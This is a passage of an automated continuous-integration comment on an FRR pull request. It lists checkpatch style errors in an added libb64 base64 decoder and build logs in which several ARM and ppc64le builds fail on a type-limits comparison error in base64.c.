+\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t        ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #116: FILE: /tmp/f1-1729/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t         ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #116: FILE: /tmp/f1-1729/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t           ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #116: FILE: /tmp/f1-1729/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t            ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #116: FILE: /tmp/f1-1729/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t              ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #116: FILE: /tmp/f1-1729/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t               ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #116: FILE: /tmp/f1-1729/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #116: FILE: /tmp/f1-1729/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t                   ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-1729/base64.c:117:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-1729/base64.c:117:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t      ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-1729/base64.c:117:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-1729/base64.c:117:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t          ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-1729/base64.c:117:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t            ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-1729/base64.c:117:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-1729/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-1729/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-1729/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-1729/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-1729/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-1729/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-1729/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-1729/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-1729/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-1729/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-1729/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-1729/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-1729/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-1729/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #120: FILE: /tmp/f1-1729/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t  ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #120: FILE: /tmp/f1-1729/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t   ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #120: FILE: /tmp/f1-1729/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t     ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #120: FILE: /tmp/f1-1729/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t      ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #120: FILE: /tmp/f1-1729/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t        ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #120: FILE: /tmp/f1-1729/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t         ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #120: FILE: /tmp/f1-1729/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t           ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #120: FILE: /tmp/f1-1729/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t            ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #120: FILE: /tmp/f1-1729/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t              ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #120: FILE: /tmp/f1-1729/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t               ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #120: FILE: /tmp/f1-1729/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #120: FILE: /tmp/f1-1729/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-1729/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-1729/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-1729/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-1729/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-1729/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-1729/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-1729/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-1729/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-1729/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-1729/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-1729/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-1729/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-1729/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-1729/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-1729/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-1729/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-1729/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-1729/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-1729/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-1729/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-1729/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t                    ^\n    \n    WARNING: Missing a blank line after declarations\n    #126: FILE: /tmp/f1-1729/base64.c:126:\n    +\tstatic const char decoding_size = sizeof(decoding);\n    +\tvalue_in -= 43;\n    \n    ERROR: trailing statements should be on next line\n    #127: FILE: /tmp/f1-1729/base64.c:127:\n    +\tif (value_in < 0 || value_in >= decoding_size) return -1;\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #131: FILE: /tmp/f1-1729/base64.c:131:\n    +void base64_init_decodestate(base64_decodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #137: FILE: /tmp/f1-1729/base64.c:137:\n    +int base64_decode_block(const char* code_in, int length_in, char* plaintext_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #137: FILE: /tmp/f1-1729/base64.c:137:\n    +int base64_decode_block(const char* code_in, int length_in, char* plaintext_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #138: FILE: /tmp/f1-1729/base64.c:138:\n    +\t\t\tbase64_decodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #140: FILE: /tmp/f1-1729/base64.c:140:\n    +\tconst char* codechar = code_in;\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #141: FILE: /tmp/f1-1729/base64.c:141:\n    +\tchar* plainchar = plaintext_out;\n    \n    ERROR: that open brace { should be on the previous line\n    #146: FILE: /tmp/f1-1729/base64.c:146:\n    +\tswitch (state_in->step)\n    +\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #148: FILE: /tmp/f1-1729/base64.c:148:\n    +\t\twhile (1)\n    +\t\t{\n    \n    WARNING: suspect code indent for conditional statements (16, 16)\n    #148: FILE: /tmp/f1-1729/base64.c:148:\n    +\t\twhile (1)\n    +\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #152: FILE: /tmp/f1-1729/base64.c:152:\n    +\t\t\t\tif (codechar == code_in+length_in)\n    +\t\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #164: FILE: /tmp/f1-1729/base64.c:164:\n    +\t\t\t\tif (codechar == code_in+length_in)\n    +\t\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #177: FILE: /tmp/f1-1729/base64.c:177:\n    +\t\t\t\tif (codechar == code_in+length_in)\n    +\t\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #190: FILE: /tmp/f1-1729/base64.c:190:\n    +\t\t\t\tif (codechar == code_in+length_in)\n    +\t\t\t\t{\n    Report for base64.h | 85 issues\n    ===============================================\n    WARNING: Block comments use * on subsequent lines\n    #2: FILE: /tmp/f1-1729/base64.h:2:\n    +/*\n    +This is part of the libb64 project, and has been placed in the public domain.\n    \n    WARNING: do not add new typedefs\n    #9: FILE: /tmp/f1-1729/base64.h:9:\n    +typedef enum\n    \n    ERROR: open brace '{' following enum go on the same line\n    #10: FILE: /tmp/f1-1729/base64.h:10:\n    +typedef enum\n    +{\n    \n    WARNING: do not add new typedefs\n    #14: FILE: /tmp/f1-1729/base64.h:14:\n    +typedef struct\n    \n    ERROR: open brace '{' following struct go on the same line\n    #15: FILE: /tmp/f1-1729/base64.h:15:\n    +typedef struct\n    +{\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #21: FILE: /tmp/f1-1729/base64.h:21:\n    +void base64_init_encodestate(base64_encodestate* state_in);\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #25: FILE: /tmp/f1-1729/base64.h:25:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #25: FILE: /tmp/f1-1729/base64.h:25:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #26: FILE: /tmp/f1-1729/base64.h:26:\n    +\t\t\tbase64_encodestate* state_in);\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #28: FILE: /tmp/f1-1729/base64.h:28:\n    +int base64_encode_blockend(char* code_out, base64_encodestate* state_in);\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #28: FILE: /tmp/f1-1729/base64.h:28:\n    +int base64_encode_blockend(char* code_out, base64_encodestate* state_in);\n    \n    WARNING: do not add new typedefs\n    #31: FILE: /tmp/f1-1729/base64.h:31:\n    +typedef enum\n    \n    ERROR: open brace '{' following enum go on the same line\n    #32: FILE: /tmp/f1-1729/base64.h:32:\n    +typedef enum\n    +{\n    \n    WARNING: do not add new typedefs\n    #36: FILE: /tmp/f1-1729/base64.h:36:\n    +typedef struct\n    \n    ERROR: open brace '{' following struct go on the same line\n    #37: FILE: /tmp/f1-1729/base64.h:37:\n    +typedef struct\n    +{\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #42: FILE: /tmp/f1-1729/base64.h:42:\n    +void base64_init_decodestate(base64_decodestate* state_in);\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #46: FILE: /tmp/f1-1729/base64.h:46:\n    +int base64_decode_block(const char* code_in, int length_in, char* plaintext_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #46: FILE: /tmp/f1-1729/base64.h:46:\n    +int base64_decode_block(const char* code_in, int length_in, char* plaintext_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #47: FILE: /tmp/f1-1729/base64.h:47:\n    +\t\t\tbase64_decodestate* state_in);\n    \n    WARNING: C99 // comments do not match recommendation\n    #49: FILE: /tmp/f1-1729/base64.h:49:\n    +#endif //_BASE64_H_\n    Report for yang_wrappers.c | 8 issues\n    ===============================================\n    < WARNING: Missing a blank line after declarations\n    < #688: FILE: /tmp/f1-1729/yang_wrappers.c:688:\n    < WARNING: Missing a blank line after declarations\n    < #691: FILE: /tmp/f1-1729/yang_wrappers.c:691:\n    < WARNING: Missing a blank line after declarations\n    < #696: FILE: /tmp/f1-1729/yang_wrappers.c:696:\n    < WARNING: Missing a blank line after declarations\n    < #709: FILE: /tmp/f1-1729/yang_wrappers.c:709:\n\n</details>\n\n</details> <details><summary>Continuous Integration Result: FAILED</summary>\n\n#  Continuous Integration Result: FAILED\n\nSee below for issues.\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3566/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n### Get source / Pull Request: Successful\n### Building Stage: Failed\n<details>\n<summary>Ubuntu 16.04 arm7 build: Failed (click for details)</summary>\nUbuntu 16.04 arm7 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3566/artifact/CI101BUILD/config.status/config.status\nUbuntu 16.04 arm7 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3566/artifact/CI101BUILD/config.log/config.log.gz\n\n__Make failed for Ubuntu 16.04 arm7 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3566/artifact/CI101BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3566/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:127:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n    Makefile:9605: recipe for target 'lib/base64.lo' failed\n    make[1]: *** [lib/base64.lo] Error 1\n    /home/ci/cibuild.3566/frr-source/doc/user/zebra.rst:23: SEVERE: Duplicate ID: \"cmdoption-configure-arg-net\".\n    /home/ci/cibuild.3566/frr-source/doc/user/zebra.rst:23: SEVERE: Duplicate ID: \"cmdoption-configure-arg-net\".\n    /home/ci/cibuild.3566/frr-source/doc/user/zebra.rst:23: SEVERE: Duplicate ID: \"cmdoption-configure-arg-net\".\n\n</details>\n<details>\n<summary>Ubuntu 18.04 arm7 build: Failed (click for details)</summary>\n\n__Make failed for Ubuntu 18.04 arm7 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3566/artifact/U18ARM7BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3566/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:127:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n    Makefile:9605: recipe for target 'lib/base64.lo' failed\n    make[1]: *** [lib/base64.lo] Error 1\n    isisd/isis_cli.c: In function isis_sr_local_block_label_range_magic:\n    isisd/isis_cli.c:1574:1: note: #pragma message: Use of the local-block command is deprecated\n     CPP_NOTICE(\"Use of the local-block command is deprecated\")\n\nUbuntu 18.04 arm7 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3566/artifact/U18ARM7BUILD/config.log/config.log.gz\nUbuntu 18.04 arm7 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3566/artifact/U18ARM7BUILD/config.status/config.status\n</details>\n<details>\n<summary>Ubuntu 16.04 arm8 build: Failed (click for details)</summary>\n\n__Make failed for Ubuntu 16.04 arm8 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3566/artifact/U16ARM8BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3566/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:127:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n    Makefile:9605: recipe for target 'lib/base64.lo' failed\n    make[1]: *** [lib/base64.lo] Error 1\n    /home/ci/cibuild.3566/frr-source/doc/user/zebra.rst:23: SEVERE: Duplicate ID: \"cmdoption-configure-arg-net\".\n    /home/ci/cibuild.3566/frr-source/doc/user/zebra.rst:23: SEVERE: Duplicate ID: \"cmdoption-configure-arg-net\".\n    /home/ci/cibuild.3566/frr-source/doc/user/zebra.rst:23: SEVERE: Duplicate ID: \"cmdoption-configure-arg-net\".\n\nUbuntu 16.04 arm8 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3566/artifact/U16ARM8BUILD/config.log/config.log.gz\nUbuntu 16.04 arm8 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3566/artifact/U16ARM8BUILD/config.status/config.status\n</details>\n<details>\n<summary>Ubuntu 18.04 arm8 build: Failed (click for details)</summary>\nUbuntu 18.04 arm8 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3566/artifact/U18ARM8BUILD/config.status/config.status\nUbuntu 18.04 arm8 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3566/artifact/U18ARM8BUILD/config.log/config.log.gz\n\n__Make failed for Ubuntu 18.04 arm8 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3566/artifact/U18ARM8BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3566/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:127:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n    Makefile:9605: recipe for target 'lib/base64.lo' failed\n    make[1]: *** [lib/base64.lo] Error 1\n    isisd/isis_cli.c: In function isis_sr_local_block_label_range_magic:\n    isisd/isis_cli.c:1574:1: note: #pragma message: Use of the local-block command is deprecated\n     CPP_NOTICE(\"Use of the local-block command is deprecated\")\n\n</details>\n<details>\n<summary>Ubuntu 18.04 ppc64le build: Failed (click for details)</summary>\n\n__Make failed for Ubuntu 18.04 ppc64le build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3566/artifact/U1804PPC64LEBUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3566/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:127:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n    Makefile:9605: recipe for target 'lib/base64.lo' failed\n    make[1]: *** [lib/base64.lo] Error 1\n    isisd/isis_cli.c: In function isis_sr_local_block_label_range_magic:\n    isisd/isis_cli.c:1574:1: note: #pragma message: Use of the local-block command is deprecated\n     CPP_NOTICE(\"Use of the local-block command is deprecated\")\n\nUbuntu 18.04 ppc64le build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3566/artifact/U1804PPC64LEBUILD/config.status/config.status\nUbuntu 18.04 ppc64le build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3566/artifact/U1804PPC64LEBUILD/config.log/config.log.gz\n</details>\n<details><summary>Successful on other platforms/tests</summary>\n\n- Ubuntu 16.04 i386 build\n- CentOS 7 amd64 build\n- Ubuntu 18.04 amd64 build\n- Debian 11 amd64 build\n- FreeBSD 11 amd64 build\n- NetBSD 9 amd64 build\n- Ubuntu 16.04 amd64 build\n- OpenBSD 7 amd64 build\n- FreeBSD 12 amd64 build\n- Redhat 8 amd64 build\n- Ubuntu 18.04 i386 build\n- Ubuntu 20.04 amd64 build\n- Debian 9 amd64 build\n- Debian 10 amd64 build\n- Fedora 29 amd64 build\n</details>\n\n### Warnings Generated during build:\n\n<details><summary>Checkout code: Successful with additional warnings</summary>\n<details>\n<summary>Ubuntu 16.04 arm7 build: Failed (click for details)</summary>\nUbuntu 16.04 arm7 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3566/artifact/CI101BUILD/config.status/config.status\nUbuntu 16.04 arm7 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3566/artifact/CI101BUILD/config.log/config.log.gz\n\n__Make failed for Ubuntu 16.04 arm7 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3566/artifact/CI101BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3566/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:127:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n    Makefile:9605: recipe for target 'lib/base64.lo' failed\n    make[1]: *** [lib/base64.lo] Error 1\n    /home/ci/cibuild.3566/frr-source/doc/user/zebra.rst:23: SEVERE: Duplicate ID: \"cmdoption-configure-arg-net\".\n    /home/ci/cibuild.3566/frr-source/doc/user/zebra.rst:23: SEVERE: Duplicate ID: \"cmdoption-configure-arg-net\".\n    /home/ci/cibuild.3566/frr-source/doc/user/zebra.rst:23: SEVERE: Duplicate ID: \"cmdoption-configure-arg-net\".\n\n</details>\n<details>\n<summary>Ubuntu 18.04 arm7 build: Failed (click for details)</summary>\n\n__Make failed for Ubuntu 18.04 arm7 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3566/artifact/U18ARM7BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3566/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:127:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n    Makefile:9605: recipe for target 'lib/base64.lo' failed\n    make[1]: *** [lib/base64.lo] Error 1\n    isisd/isis_cli.c: In function isis_sr_local_block_label_range_magic:\n    isisd/isis_cli.c:1574:1: note: #pragma message: Use of the local-block command is deprecated\n     CPP_NOTICE(\"Use of the local-block command is deprecated\")\n\nUbuntu 18.04 arm7 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3566/artifact/U18ARM7BUILD/config.log/config.log.gz\nUbuntu 18.04 arm7 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3566/artifact/U18ARM7BUILD/config.status/config.status\n</details>\n<details>\n<summary>Ubuntu 16.04 arm8 build: Failed (click for details)</summary>\n\n__Make failed for Ubuntu 16.04 arm8 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3566/artifact/U16ARM8BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3566/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:127:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n    Makefile:9605: recipe for target 'lib/base64.lo' failed\n    make[1]: *** [lib/base64.lo] Error 1\n    /home/ci/cibuild.3566/frr-source/doc/user/zebra.rst:23: SEVERE: Duplicate ID: \"cmdoption-configure-arg-net\".\n    /home/ci/cibuild.3566/frr-source/doc/user/zebra.rst:23: SEVERE: Duplicate ID: \"cmdoption-configure-arg-net\".\n    /home/ci/cibuild.3566/frr-source/doc/user/zebra.rst:23: SEVERE: Duplicate ID: \"cmdoption-configure-arg-net\".\n\nUbuntu 16.04 arm8 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3566/artifact/U16ARM8BUILD/config.log/config.log.gz\nUbuntu 16.04 arm8 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3566/artifact/U16ARM8BUILD/config.status/config.status\n</details>\n<details>\n<summary>Ubuntu 18.04 arm8 build: Failed (click for details)</summary>\nUbuntu 18.04 arm8 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3566/artifact/U18ARM8BUILD/config.status/config.status\nUbuntu 18.04 arm8 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3566/artifact/U18ARM8BUILD/config.log/config.log.gz\n\n__Make failed for Ubuntu 18.04 arm8 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3566/artifact/U18ARM8BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3566/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:127:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n    Makefile:9605: recipe for target 'lib/base64.lo' failed\n    make[1]: *** [lib/base64.lo] Error 1\n    isisd/isis_cli.c: In function isis_sr_local_block_label_range_magic:\n    isisd/isis_cli.c:1574:1: note: #pragma message: Use of the local-block command is deprecated\n     CPP_NOTICE(\"Use of the local-block command is deprecated\")\n\n</details>\n<details>\n<summary>Ubuntu 18.04 ppc64le build: Failed (click for details)</summary>\n\n__Make failed for Ubuntu 18.04 ppc64le build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3566/artifact/U1804PPC64LEBUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3566/frr-source'\n    